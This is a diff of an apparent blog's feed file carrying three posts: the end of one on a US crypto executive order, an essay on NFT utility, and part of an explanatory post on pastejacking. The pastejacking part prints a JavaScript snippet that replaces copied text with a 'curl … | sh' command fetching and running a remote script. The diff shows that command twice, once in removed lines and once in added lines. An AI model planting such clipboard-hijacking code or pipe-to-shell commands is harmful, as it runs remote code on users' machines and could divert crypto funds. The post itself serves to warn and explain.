-&lt;p&gt;This post will start with my preamble of the problem existing with current common viewpoints, describe the technology behind NFTs in a way that makes sense to a human, and discuss the potential applications of this technology that can, with any luck, help further the discussion surrounding the use of NFTs.&lt;/p&gt;
+<h2 id="the-future-of-ensuring-responsible-development-of-digital-assets">The Future of Ensuring Responsible Development of Digital Assets</h2>
 
-&lt;h2 id=&quot;the-problem-with-the-current-approach-to-nfts&quot;&gt;The Problem with the Current Approach to NFTs&lt;/h2&gt;
+<p>This executive order is more descriptive than prescriptive, falling in line with guidelines such as the <a href="https://cycode.com/blog/nist-ssdf-explained/">NIST SSDF</a>. As the key measures are explored and mature, we can expect guidance to take a more solid form.</p>
 
-&lt;p&gt;The tragedy of commons isn’t a new idea, having origins in Greek antiquity. NFTs are still a new concept, but they have seen widespread exposure. The utility of minting NFTs is not well defined; we will waste energy in extraneous applications of blockchain technologies until we understand the benefits.&lt;/p&gt;
+<p>Often, the patterns of the past give clues about the future. The 1913 Federal Reserve Act, passed in the wake of the turn of the century banking crises, created the current Federal Reserve System and introduced a central bank to oversee U.S. monetary policy. This policy was deemed necessary because of the inability of the market to achieve stability in a laissez-faire environment.</p>
 
-&lt;p&gt;&lt;strong&gt;To understand the usefulness of this emerging technology, we must first understand the nature of the technology behind NFTs.&lt;/strong&gt;&lt;/p&gt;
+<p>Historians may compare Biden’s executive order on crypto to the monetary policies introduced a century ago. The most significant impact of this executive order will be the introduction of compliance standards and regulations design to hold institutions accountable.</p>
 
-&lt;p&gt;Sentiment regarding NFTs stands inverse to knowledge surrounding NFTs:&lt;/p&gt;
+<p>While the introduction of crypto compliance standards may shock current digital asset service providers, this will also increase the number of older institutions that choose to enter the blockchain asset space. <a href="https://tokenpost.com/American-consumers-want-Bitcoin-BTC-and-crypto-related-services-from-their-banks-8240">With 32% of crypto owners</a> stating they would consider crypto services provided directly through their banks, these banks have an incentive to dip their toes into offering cryptocurrency amenities.</p>
 
-&lt;p&gt;&lt;img src=&quot;../../../../../assets/image/maximizing-nft-utility-chart-knowledge-forkbomb.png&quot; alt=&quot;pastejacking-crypto-wallets-forkbomb-address-theft-defi&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+<h3 id="navigating-todays-crypto-landscape">Navigating Today’s Crypto Landscape</h3>
 
-&lt;p&gt;That annoying, MLM-pitching guy on Instagram posting about crypto and NFTs bragging about how it’s the future? He has no idea how blockchain technology works nor the benefits of such applications. The self-righteous netbanger virtue signaling how they don’t want to contribute to capitalism and pollution? They are correct about the unsustainability but are missing the obvious solution.&lt;/p&gt;
+<p>In the long run, the introduction of compliance standards will improve the accessibility of crypto and provide more protections for everyday users. However, we do not yet have outlined best practices available for web 3 development, which puts this ecosystem at heightened risk.</p>
 
-&lt;p&gt;There is an issue rooted in the more significant problem of human unsustainability in many categories, including methods of energy generation. This failure should not reflect on the technical abilities of an immature technology. If you:&lt;/p&gt;
+<p>For individual asset holders, the optimal approach is to follow defacto best practices for digital asset security. These practices include:</p>
 
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;drive a personal car,&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;play video games, or&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;use air conditioning,&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
+<ul>
+  <li>Performing disaster recovery drills for hot, cold, and paper wallets.</li>
+  <li>Preventing physical access to hardware wallets.</li>
+  <li>Utilizing 2FA or MFA for authentication.</li>
+  <li>Maintaining separate hot wallet(s) for daily transactions while storing the rest of your crypto assets in a cold wallet(s).</li>
+  <li>Staying vigilant against socially engineered attacks, such as phishing emails, <a href="https://forkbomb.io/blog/pastejacking-smart-contracts">pastejacking attacks</a>, and malicious ads.</li>
+</ul>
 
-&lt;p&gt;then your anger is misplaced. This statement doesn’t intend to exemplify a &lt;em&gt;tu quoque&lt;/em&gt; fallacy but direct attention to what energy sources are familiar–coal, gas, or another nonrenewable. Our system is at fault, not this tool.&lt;/p&gt;
+<h3 id="conclusion">Conclusion</h3>
 
-&lt;p&gt;NFTs are data defined on the blockchain. The technology is only as powerful as the application.&lt;/p&gt;
+<p>This executive order demonstrates that necessary investigations are underway regarding how we can utilize blockchain technologies to maximize societal benefit. These compliance requirements will hopefully push web 3 builders to adopt secure practices in their application development and deployment processes.</p>]]></content><author><name></name></author><category term="blog" /><summary type="html"><![CDATA[Cryptocurrency has seen dramatic growth since its inception in 2009. Around 16% of American adults have invested in cryptocurrencies. In theme with prior executive orders advancing US cyber policy, the White House recently signed an executive order on cryptocurrencies and other digital assets. Crypto enthusiasts view this as a win, but what does ensuring the responsible development of digital asset mean for the average American?]]></summary></entry><entry><title type="html">Maximizing the Benefit and Utility of Minting NFTs</title><link href="http://localhost:4000/blog/maximizing-the-benefit-and-utility-of-minting-nfts" rel="alternate" type="text/html" title="Maximizing the Benefit and Utility of Minting NFTs" /><published>2022-03-13T00:00:00-08:00</published><updated>2022-03-13T00:00:00-08:00</updated><id>http://localhost:4000/blog/maximizing-the-benefit-and-utility-of-minting-nfts</id><content type="html" xml:base="http://localhost:4000/blog/maximizing-the-benefit-and-utility-of-minting-nfts"><![CDATA[<p>NFTs have been a hot trend in tech but face criticism regarding their lack of obvious utility. I started this off as a vent post for my frustration regarding the current discourse around NFTs. Still, I decided about midway through that energy might be better spent trying to help answer the pertinent questions: What are the benefits of minting NFTs, and how can we maximize the utility of NFTs?</p>
 
-&lt;p&gt;Beyond this lack of understanding, we don’t lead with the key benefits to minting NFTs. There is an obsession with the ability of NFTs to provide ownership. This common consensus is warped–the power of NFTs to provide origination proof is the most significant benefit of the technology.&lt;/p&gt;
+<p>This post will start with my preamble of the problem existing with current common viewpoints, describe the technology behind NFTs in a way that makes sense to a human, and discuss the potential applications of this technology that can, with any luck, help further the discussion surrounding the use of NFTs.</p>
 
-&lt;p&gt;Put another way, NFTs are ultimately just tools. Holding such strong sentiment about a tool makes about as much sense as raging against the concept of hammers. Having a solid opinion regarding hammers makes more sense than dying on any hill related to NFTs since:&lt;/p&gt;
+<h2 id="the-problem-with-the-current-approach-to-nfts">The Problem with the Current Approach to NFTs</h2>
 
-&lt;ul&gt;
-  &lt;li&gt;the use case of hammers is defined and well established&lt;/li&gt;
-  &lt;li&gt;the technology surrounding hammers is mature&lt;/li&gt;
-&lt;/ul&gt;
+<p>The tragedy of commons isn’t a new idea, having origins in Greek antiquity. NFTs are still a new concept, but they have seen widespread exposure. The utility of minting NFTs is not well defined; we will waste energy in extraneous applications of blockchain technologies until we understand the benefits.</p>
 
-&lt;p&gt;To properly use a tool, one must understand the benefits. What can the technology do efficiently? The answer to this question leads us to achieve utility for NFTs.&lt;/p&gt;
+<p><strong>To understand the usefulness of this emerging technology, we must first understand the nature of the technology behind NFTs.</strong></p>
 
-&lt;h2 id=&quot;the-key-benefits-to-minting-nfts&quot;&gt;The Key Benefits to Minting NFTs&lt;/h2&gt;
+<p>Sentiment regarding NFTs stands inverse to knowledge surrounding NFTs:</p>
 
-&lt;h4 id=&quot;immutable&quot;&gt;Immutable&lt;/h4&gt;
+<p><img src="../../../../../assets/image/maximizing-nft-utility-chart-knowledge-forkbomb.png" alt="pastejacking-crypto-wallets-forkbomb-address-theft-defi" class="img-responsive" /></p>
 
-&lt;p&gt;Once a person mints an NFT, &lt;strong&gt;the decentralized ledger stores the uploaded data forever&lt;/strong&gt;. This data cannot be modified, making disputes regarding the ownership history of a digital asset a thing of the past. No one may change information uploaded to the blockchain through the minting process.&lt;/p&gt;
+<p>That annoying, MLM-pitching guy on Instagram posting about crypto and NFTs bragging about how it’s the future? He has no idea how blockchain technology works nor the benefits of such applications. The self-righteous netbanger virtue signaling how they don’t want to contribute to capitalism and pollution? They are correct about the unsustainability but are missing the obvious solution.</p>
 
-&lt;p&gt;This attribute of immutability is a double-edged sword; if clerical errors are introduced and not corrected before minting, they are propagated across the nodes of the system and cannot be modified. The lack of remediation options is a crucial downside to using a public blockchain: with no central authority, no resource exists to remediate mistakes or provide reassurance of ownership–it is for the same reason that &lt;a href=&quot;https://www.coindesk.com/tech/2021/12/08/bitcoins-lost-coins-are-worth-the-price/&quot;&gt;nearly 1 in 5 bitcoins are lost forever&lt;/a&gt;.&lt;/p&gt;
+<p>There is an issue rooted in the more significant problem of human unsustainability in many categories, including methods of energy generation. This failure should not reflect on the technical abilities of an immature technology. If you:</p>
 
-&lt;h4 id=&quot;decentralized&quot;&gt;Decentralized&lt;/h4&gt;
+<ul>
+  <li>
+    <p>drive a personal car,</p>
+  </li>
+  <li>
+    <p>play video games, or</p>
+  </li>
+  <li>
+    <p>use air conditioning,</p>
+  </li>
+</ul>
 
-&lt;p&gt;The decentralized nature of blockchain technology means that users may &lt;a href=&quot;https://interscity.org/assets/AutAvailChain-Automatic-and-Secure-Data-Availability-through-Blockchain.pdf&quot;&gt;readily access data&lt;/a&gt; stored in this ledger. In addition, it is nearly impossible to tamper with data within this ledger. The only “feasible” way to tamper with decentrally stored data is to simultaneously tamper with each blockchain node.&lt;/p&gt;
+<p>then your anger is misplaced. This statement doesn’t intend to exemplify a <em>tu quoque</em> fallacy but direct attention to what energy sources are familiar–coal, gas, or another nonrenewable. Our system is at fault, not this tool.</p>
 
-&lt;p&gt;Data stored on the blockchain is much more readily available than from non-distributed ledgers, thus improving the accessibility of the data. This plays a part in preventing retrieval delays and bottlenecks that can occur with centralized databases that don’t take advantage of CDNs.&lt;/p&gt;
+<p>NFTs are data defined on the blockchain. The technology is only as powerful as the application.</p>
 
-&lt;p&gt;The three main pillars of information security include confidentiality, integrity, and availability. &lt;strong&gt;The decentralized nature of blockchain-bound assets, including NFTs, allows for verification of the integrity and availability of data&lt;/strong&gt;. However, as all data tied to the blockchain is publically available, confidentially cannot be expected. Credentials and secrets, regardless of encryption, should never be added to the immutable ledger.&lt;/p&gt;
+<p>Beyond this lack of understanding, we don’t lead with the key benefits to minting NFTs. There is an obsession with the ability of NFTs to provide ownership. This common consensus is warped–the power of NFTs to provide origination proof is the most significant benefit of the technology.</p>
 
-&lt;h4 id=&quot;smart-contract-bound&quot;&gt;Smart Contract Bound&lt;/h4&gt;
+<p>Put another way, NFTs are ultimately just tools. Holding such strong sentiment about a tool makes about as much sense as raging against the concept of hammers. Having a solid opinion regarding hammers makes more sense than dying on any hill related to NFTs since:</p>
 
-&lt;p&gt;NFTs may utilize smart contracts as part of their design. A smart contract is the agreement-in-code within the blockchain, enabling the network to store the information indicated within an NFT transaction. This smart contract may be reused as a means of transferring NFT ownership from wallet to wallet.&lt;/p&gt;
+<ul>
+  <li>the use case of hammers is defined and well established</li>
+  <li>the technology surrounding hammers is mature</li>
+</ul>
 
-&lt;p&gt;&lt;strong&gt;Smart contract developers may bake usage stipulations into the NFT&lt;/strong&gt;. This capability unlocks possibilities for artists: &lt;a href=&quot;https://cyberscrilla.com/nft-royalties-what-are-they-and-how-do-they-work/&quot;&gt;royalties&lt;/a&gt; may be hardcoded into the smart contract. We have already seen disruptions within the art world resulting from the fact that artists can now profit from their art in the short term–one doesn’t have to come from money to survive as an artist.&lt;/p&gt;
+<p>To properly use a tool, one must understand the benefits. What can the technology do efficiently? The answer to this question leads us to achieve utility for NFTs.</p>
 
-&lt;h2 id=&quot;use-cases-maximizing-nft-utility&quot;&gt;Use Cases Maximizing NFT Utility&lt;/h2&gt;
+<h2 id="the-key-benefits-to-minting-nfts">The Key Benefits to Minting NFTs</h2>
 
-&lt;p&gt;Now that we have laid out the benefits provided by NFTs let’s discuss use cases taking these benefits into account.&lt;/p&gt;
+<h4 id="immutable">Immutable</h4>
 
-&lt;h4 id=&quot;proof-of-origination--provenance&quot;&gt;Proof of Origination / Provenance&lt;/h4&gt;
+<p>Once a person mints an NFT, <strong>the decentralized ledger stores the uploaded data forever</strong>. This data cannot be modified, making disputes regarding the ownership history of a digital asset a thing of the past. No one may change information uploaded to the blockchain through the minting process.</p>
 
-&lt;p&gt;&lt;strong&gt;Tracing the custodial history of an asset&lt;/strong&gt; is not a new concept–provenance helps establish an item’s significance and value based on its chain of ownership. The decentralized, immutable nature of the blockchain means that interested parties may trace the provenance of an NFT through the ledger.&lt;/p&gt;
+<p>This attribute of immutability is a double-edged sword; if clerical errors are introduced and not corrected before minting, they are propagated across the nodes of the system and cannot be modified. The lack of remediation options is a crucial downside to using a public blockchain: with no central authority, no resource exists to remediate mistakes or provide reassurance of ownership–it is for the same reason that <a href="https://www.coindesk.com/tech/2021/12/08/bitcoins-lost-coins-are-worth-the-price/">nearly 1 in 5 bitcoins are lost forever</a>.</p>
 
-&lt;p&gt;&lt;a href=&quot;https://moxie.org/2022/01/07/web3-first-impressions.html&quot;&gt;As evidenced in Moxie’s demonstration&lt;/a&gt;, the NFT’s integrity is only as strong as the integrity of the utilized hosting service and the authenticity of the 3.0 implementation. If a service is inauthentic in its use of Web 3.0 architecture (looking at you OpenSea) and the host has a mind to tamper with the content, there is no guarantee that the content has not been corrupted.&lt;/p&gt;
+<h4 id="decentralized">Decentralized</h4>
 
-&lt;p&gt;Because of the expensive and rising gas costs, it’s unrealistic to expect public blockchains to store ever-growing file sizes. Thus, holding the entirety of an image on the blockchain is unrealistic for most applications.&lt;/p&gt;
+<p>The decentralized nature of blockchain technology means that users may <a href="https://interscity.org/assets/AutAvailChain-Automatic-and-Secure-Data-Availability-through-Blockchain.pdf">readily access data</a> stored in this ledger. In addition, it is nearly impossible to tamper with data within this ledger. The only “feasible” way to tamper with decentrally stored data is to simultaneously tamper with each blockchain node.</p>
 
-&lt;p&gt;To counter this, we may use a form of validation to ensure data integrity. For example, verifying the originality could be performed by visual cryptography. However, the origination point referenced when the creator mints the NFT is immutable even without validation. Therefore, &lt;strong&gt;minting an NFT establishes a point of origination that ties a work back to the original wallet regardless of the number of total transactions&lt;/strong&gt;.&lt;/p&gt;
+<p>Data stored on the blockchain is much more readily available than from non-distributed ledgers, thus improving the accessibility of the data. This plays a part in preventing retrieval delays and bottlenecks that can occur with centralized databases that don’t take advantage of CDNs.</p>
 
-&lt;h4 id=&quot;certification&quot;&gt;Certification&lt;/h4&gt;
+<p>The three main pillars of information security include confidentiality, integrity, and availability. <strong>The decentralized nature of blockchain-bound assets, including NFTs, allows for verification of the integrity and availability of data</strong>. However, as all data tied to the blockchain is publically available, confidentially cannot be expected. Credentials and secrets, regardless of encryption, should never be added to the immutable ledger.</p>
 
-&lt;p&gt;The fact that the reference is immutable and the origination of NFTs is reliable makes this digital asset perfect for providing a form of certification, such as a diploma, an accreditation, or another form of a certificate. For this use case, using an NFT to represent a certificate takes advantage of the proof of origination capabilities to provide enhanced verification of authenticity. If the issuing institution publically lists the wallet used to generate NFT certificates, interested parties can prove the certificates by scanning for the originating address. &lt;strong&gt;Forging a paper of digital document is easy, but faking origination tied to a wallet address is next to impossible&lt;/strong&gt;.&lt;/p&gt;
+<h4 id="smart-contract-bound">Smart Contract Bound</h4>
 
-&lt;p&gt;Depending on the specific implementation and the terms outlined in the smart contract, developers building this underlying smart contract may make this certificate to expire after a particular timestamp. This functionality solves an additional problem: checking whether accreditation is expired, revoked, or otherwise invalid.&lt;/p&gt;
+<p>NFTs may utilize smart contracts as part of their design. A smart contract is the agreement-in-code within the blockchain, enabling the network to store the information indicated within an NFT transaction. This smart contract may be reused as a means of transferring NFT ownership from wallet to wallet.</p>
 
-&lt;h4 id=&quot;untamperable-checksums&quot;&gt;Untamperable Checksums&lt;/h4&gt;
+<p><strong>Smart contract developers may bake usage stipulations into the NFT</strong>. This capability unlocks possibilities for artists: <a href="https://cyberscrilla.com/nft-royalties-what-are-they-and-how-do-they-work/">royalties</a> may be hardcoded into the smart contract. We have already seen disruptions within the art world resulting from the fact that artists can now profit from their art in the short term–one doesn’t have to come from money to survive as an artist.</p>
 
-&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Checksum#:~:text=A%20checksum%20is%20a%20small,upon%20to%20verify%20data%20authenticity.&quot;&gt;Checksums&lt;/a&gt; are small, byte-sized blocks of data derived from a source of data. They are used to detect errors that transmission or storage may have introduced. Developers often use checksums to verify data integrity, but since they do not contain origination information, we cannot verify data authenticity.&lt;/p&gt;
+<h2 id="use-cases-maximizing-nft-utility">Use Cases Maximizing NFT Utility</h2>
 
-&lt;p&gt;&lt;strong&gt;Creating checksum NFTs solves the problem of verifying data authenticity because relevant stakeholders may prove the origination of these checksums&lt;/strong&gt;. Because these &lt;a href=&quot;https://ethglobal.com/showcase/nft-checksum-dwqfv&quot;&gt;NFT checksums&lt;/a&gt; are immutable and decentralized, organizations may use them to guarantee that errors and tampering have not occurred.&lt;/p&gt;
+<p>Now that we have laid out the benefits provided by NFTs let’s discuss use cases taking these benefits into account.</p>
 
-&lt;h3 id=&quot;conclusion-maximizing-the-benefits-of-nfts&quot;&gt;Conclusion: Maximizing the Benefits of NFTs&lt;/h3&gt;
+<h4 id="proof-of-origination--provenance">Proof of Origination / Provenance</h4>
 
-&lt;p&gt;Here’s the bottom line: NFTs and even blockchain broadly are technologically immature. Necessity existing as the mother of invention is dead: instead, we unlock capabilities and flail about seeking optimal applications. We must understand the benefits of the technology to maximize the tool’s utility. These include:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;The immutability of information added to public blockchains.&lt;/li&gt;
-  &lt;li&gt;The decentralized nature of NFT storage.&lt;/li&gt;
-  &lt;li&gt;The guaranteeds offered by smart contracts.&lt;/li&gt;
-&lt;/ul&gt;
+<p><strong>Tracing the custodial history of an asset</strong> is not a new concept–provenance helps establish an item’s significance and value based on its chain of ownership. The decentralized, immutable nature of the blockchain means that interested parties may trace the provenance of an NFT through the ledger.</p>
 
-&lt;p&gt;We’re looking at NFTs in their dial-up phase. The 90s Yahoo version. The AOL messenger phase. The first phase of smart-contract bound digital assets is here. It’s crude, nebulous, and not well explored, but to explore the unknown is human—the frontier beckons.&lt;/p&gt;</content><author><name></name></author><category term="blog" /><summary type="html">NFTs have been a hot trend in tech but face criticism regarding their lack of obvious utility. I started this off as a vent post for my frustration regarding the current discourse around NFTs. Still, I decided about midway through that energy might be better spent trying to help answer the pertinent questions: What are the benefits of minting NFTs, and how can we maximize the utility of NFTs?</summary></entry><entry><title type="html">Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data</title><link href="http://localhost:4000/blog/pastejacking-smart-contracts" rel="alternate" type="text/html" title="Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data" /><published>2021-12-31T00:00:00-08:00</published><updated>2021-12-31T00:00:00-08:00</updated><id>http://localhost:4000/blog/pastejacking-smart-contracts</id><content type="html" xml:base="http://localhost:4000/blog/pastejacking-smart-contracts">&lt;p&gt;The last several years have brought incredible gains in the number of cyberattacks waged. These attacks entail a variety of exploits, with some using methods as simple as social engineering. Human behavior is often the weakest link, and a particular javascript exploit takes advantage of trust in a computer’s copy-and-paste functionality.  This form of attack, commonly referred to as &lt;a href=&quot;https://www.geeksforgeeks.org/what-is-pastejacking/&quot;&gt;pastejacking&lt;/a&gt;, can fit into many different cyberattack campaigns. This attack takes advantage of one of the most common user interactions with a computer.&lt;/p&gt;
+<p><a href="https://moxie.org/2022/01/07/web3-first-impressions.html">As evidenced in Moxie’s demonstration</a>, the NFT’s integrity is only as strong as the integrity of the utilized hosting service and the authenticity of the 3.0 implementation. If a service is inauthentic in its use of Web 3.0 architecture (looking at you OpenSea) and the host has a mind to tamper with the content, there is no guarantee that the content has not been corrupted.</p>
 
-&lt;p&gt;Pastejacking attacks exploit temporary storage memory by replacing copied data stored in device memory with different, often malicious, data. This exploit may take the form of a client-side or a server-side attack.&lt;/p&gt;
+<p>Because of the expensive and rising gas costs, it’s unrealistic to expect public blockchains to store ever-growing file sizes. Thus, holding the entirety of an image on the blockchain is unrealistic for most applications.</p>
 
-&lt;p&gt;Server-side pastejacking attacks may fit within a software supply chain attack: attackers can manipulate a compromised entity to attack downstream users or clients. 
-Using methods such as &lt;a href=&quot;https://owasp.org/www-community/attacks/DOM_Based_XSS&quot;&gt;cross-site scripting (XSS) attacks&lt;/a&gt;, an attacker can wage client-side pastejacking attacks, which can be especially effective if targeting developers. Cyberattacks waged on developers often have a high return on investment because capturing developer credentials affords an attacker a significant amount of lateral movement throughout an organization.&lt;/p&gt;
+<p>To counter this, we may use a form of validation to ensure data integrity. For example, verifying the originality could be performed by visual cryptography. However, the origination point referenced when the creator mints the NFT is immutable even without validation. Therefore, <strong>minting an NFT establishes a point of origination that ties a work back to the original wallet regardless of the number of total transactions</strong>.</p>
 
-&lt;h2 id=&quot;how-javascript-pastejacking-works&quot;&gt;How Javascript Pastejacking Works&lt;/h2&gt;
+<h4 id="certification">Certification</h4>
 
-&lt;p&gt;For demonstration purposes, let’s take a look at the following Javascript code snippet:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
-document.getElementById(&apos;copied-text&apos;).addEventListener(&apos;copy&apos;, 
+<p>The fact that the reference is immutable and the origination of NFTs is reliable makes this digital asset perfect for providing a form of certification, such as a diploma, an accreditation, or another form of a certificate. For this use case, using an NFT to represent a certificate takes advantage of the proof of origination capabilities to provide enhanced verification of authenticity. If the issuing institution publically lists the wallet used to generate NFT certificates, interested parties can prove the certificates by scanning for the originating address. <strong>Forging a paper of digital document is easy, but faking origination tied to a wallet address is next to impossible</strong>.</p>
+
+<p>Depending on the specific implementation and the terms outlined in the smart contract, developers building this underlying smart contract may make this certificate to expire after a particular timestamp. This functionality solves an additional problem: checking whether accreditation is expired, revoked, or otherwise invalid.</p>
+
+<h4 id="untamperable-checksums">Untamperable Checksums</h4>
+
+<p><a href="https://en.wikipedia.org/wiki/Checksum#:~:text=A%20checksum%20is%20a%20small,upon%20to%20verify%20data%20authenticity.">Checksums</a> are small, byte-sized blocks of data derived from a source of data. They are used to detect errors that transmission or storage may have introduced. Developers often use checksums to verify data integrity, but since they do not contain origination information, we cannot verify data authenticity.</p>
+
+<p><strong>Creating checksum NFTs solves the problem of verifying data authenticity because relevant stakeholders may prove the origination of these checksums</strong>. Because these <a href="https://ethglobal.com/showcase/nft-checksum-dwqfv">NFT checksums</a> are immutable and decentralized, organizations may use them to guarantee that errors and tampering have not occurred.</p>
+
+<h3 id="conclusion-maximizing-the-benefits-of-nfts">Conclusion: Maximizing the Benefits of NFTs</h3>
+
+<p>Here’s the bottom line: NFTs and even blockchain broadly are technologically immature. Necessity existing as the mother of invention is dead: instead, we unlock capabilities and flail about seeking optimal applications. We must understand the benefits of the technology to maximize the tool’s utility. These include:</p>
+<ul>
+  <li>The immutability of information added to public blockchains.</li>
+  <li>The decentralized nature of NFT storage.</li>
+  <li>The guaranteeds offered by smart contracts.</li>
+</ul>
+
+<p>We’re looking at NFTs in their dial-up phase. The 90s Yahoo version. The AOL messenger phase. The first phase of smart-contract bound digital assets is here. It’s crude, nebulous, and not well explored, but to explore the unknown is human—the frontier beckons.</p>]]></content><author><name></name></author><category term="blog" /><summary type="html"><![CDATA[NFTs have been a hot trend in tech but face criticism regarding their lack of obvious utility. I started this off as a vent post for my frustration regarding the current discourse around NFTs. Still, I decided about midway through that energy might be better spent trying to help answer the pertinent questions: What are the benefits of minting NFTs, and how can we maximize the utility of NFTs?]]></summary></entry><entry><title type="html">Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data</title><link href="http://localhost:4000/blog/pastejacking-smart-contracts" rel="alternate" type="text/html" title="Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data" /><published>2021-12-31T00:00:00-08:00</published><updated>2021-12-31T00:00:00-08:00</updated><id>http://localhost:4000/blog/pastejacking-smart-contracts</id><content type="html" xml:base="http://localhost:4000/blog/pastejacking-smart-contracts"><![CDATA[<p>The last several years have brought incredible gains in the number of cyberattacks waged. These attacks entail a variety of exploits, with some using methods as simple as social engineering. Human behavior is often the weakest link, and a particular javascript exploit takes advantage of trust in a computer’s copy-and-paste functionality.  This form of attack, commonly referred to as <a href="https://www.geeksforgeeks.org/what-is-pastejacking/">pastejacking</a>, can fit into many different cyberattack campaigns. This attack takes advantage of one of the most common user interactions with a computer.</p>
+
+<p>Pastejacking attacks exploit temporary storage memory by replacing copied data stored in device memory with different, often malicious, data. This exploit may take the form of a client-side or a server-side attack.</p>
+
+<p>Server-side pastejacking attacks may fit within a software supply chain attack: attackers can manipulate a compromised entity to attack downstream users or clients. 
+Using methods such as <a href="https://owasp.org/www-community/attacks/DOM_Based_XSS">cross-site scripting (XSS) attacks</a>, an attacker can wage client-side pastejacking attacks, which can be especially effective if targeting developers. Cyberattacks waged on developers often have a high return on investment because capturing developer credentials affords an attacker a significant amount of lateral movement throughout an organization.</p>
+
+<h2 id="how-javascript-pastejacking-works">How Javascript Pastejacking Works</h2>
+
+<p>For demonstration purposes, let’s take a look at the following Javascript code snippet:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
+document.getElementById('copied-text').addEventListener('copy', 
 function(e) {
-    e.clipboardData.setData(&apos;text/plain&apos;, 
-        &apos;curl https://forkbomb.io/shadowrealm | sh\n&apos;
+    e.clipboardData.setData('text/plain', 
+        'curl https://forkbomb.io/shadowrealm | sh\n'
     );
     e.preventDefault();
 });
-&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;/script&gt;
+</code></pre></div></div>
 
-&lt;p&gt;Attackers may execute this code through various means; this attack may be waged on an organization through a form of code tampering or used on individual users through a client-side injection attack.&lt;/p&gt;
+<p>Attackers may execute this code through various means; this attack may be waged on an organization through a form of code tampering or used on individual users through a client-side injection attack.</p>
 
-&lt;h2 id=&quot;using-pastejacking-to-attack-developers&quot;&gt;Using Pastejacking to Attack Developers&lt;/h2&gt;
+<h2 id="using-pastejacking-to-attack-developers">Using Pastejacking to Attack Developers</h2>
 
-&lt;p&gt;Let’s say a junior programmer is attempting to utilize a code snippet from StackOverflow, which is not an unusual scenario that most software engineers have done at some point in their career. A malicious entity wages an attack against users trying to copy and paste a code snippet from the web browser into their terminal.&lt;/p&gt;
+<p>Let’s say a junior programmer is attempting to utilize a code snippet from StackOverflow, which is not an unusual scenario that most software engineers have done at some point in their career. A malicious entity wages an attack against users trying to copy and paste a code snippet from the web browser into their terminal.</p>
 
-&lt;p&gt;The javascript function as defined above replaces the copied text within the clipboard, thus overriding the in-memory data and replacing it with:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl https://forkbomb.io/shadowrealm | sh\n
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;This string is a curl command that navigates a user to the URL &lt;a href=&quot;https://forkbomb.io/shadowrealm/&quot;&gt;https://forkbomb.io/shadowrealm&lt;/a&gt;, which in this case is a striking yet graceful warning to users.&lt;/p&gt;
+<p>The javascript function as defined above replaces the copied text within the clipboard, thus overriding the in-memory data and replacing it with:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://forkbomb.io/shadowrealm | sh\n
+</code></pre></div></div>
+<p>This string is a curl command that navigates a user to the URL <a href="https://forkbomb.io/shadowrealm/">https://forkbomb.io/shadowrealm</a>, which in this case is a striking yet graceful warning to users.</p>
 
-&lt;p&gt;Because the pasted snippet includes the string sh\n, the command runs immediately as if the user had manually pressed the return key, thus preventing a user from realizing what is happening until the attack is underway.&lt;/p&gt;
+<p>Because the pasted snippet includes the string sh\n, the command runs immediately as if the user had manually pressed the return key, thus preventing a user from realizing what is happening until the attack is underway.</p>
 
-&lt;p&gt;This form of attack can be hazardous as this can be a form of &lt;a href=&quot;https://cycode.com/blog/why-developers-are-hackers-new-targets-and-what-to-do-about-it/&quot;&gt;targeting developers&lt;/a&gt; who often have elevated credentials. Malicious actors may use a pastejacking attack within systems that do not adhere to principles of least privilege. Developer credentials often allow escalated privileges to accelerate developer velocity. Allowing for greater access within a development ecosystem reduces security between components, thus permitting lateral movement that can give an attacker full access to an organization’s data. This can allow attackers to perform data exfiltration or leak source code; in either case, this will be devastating for an organization’s reputation and finances.&lt;/p&gt;
+<p>This form of attack can be hazardous as this can be a form of <a href="https://cycode.com/blog/why-developers-are-hackers-new-targets-and-what-to-do-about-it/">targeting developers</a> who often have elevated credentials. Malicious actors may use a pastejacking attack within systems that do not adhere to principles of least privilege. Developer credentials often allow escalated privileges to accelerate developer velocity. Allowing for greater access within a development ecosystem reduces security between components, thus permitting lateral movement that can give an attacker full access to an organization’s data. This can allow attackers to perform data exfiltration or leak source code; in either case, this will be devastating for an organization’s reputation and finances.</p>
 
-&lt;h2 id=&quot;using-pastejacking-to-attack-crypto-wallets&quot;&gt;Using Pastejacking to Attack Crypto Wallets&lt;/h2&gt;
+<h2 id="using-pastejacking-to-attack-crypto-wallets">Using Pastejacking to Attack Crypto Wallets</h2>
 
-&lt;p&gt;More nefarious, if subtle, applications of this technique exist. Let’s consider crypto wallet addresses. These addresses are 26-35 characters long and consist of alphanumeric values. This address is often copied and pasted from one application to another to send crypto assets from one wallet to another. This copy and paste pattern provides a window of opportunity for attackers to wage a client-side injection attack utilizing such a script as defined above.&lt;/p&gt;
+<p>More nefarious, if subtle, applications of this technique exist. Let’s consider crypto wallet addresses. These addresses are 26-35 characters long and consist of alphanumeric values. This address is often copied and pasted from one application to another to send crypto assets from one wallet to another. This copy and paste pattern provides a window of opportunity for attackers to wage a client-side injection attack utilizing such a script as defined above.</p>
 
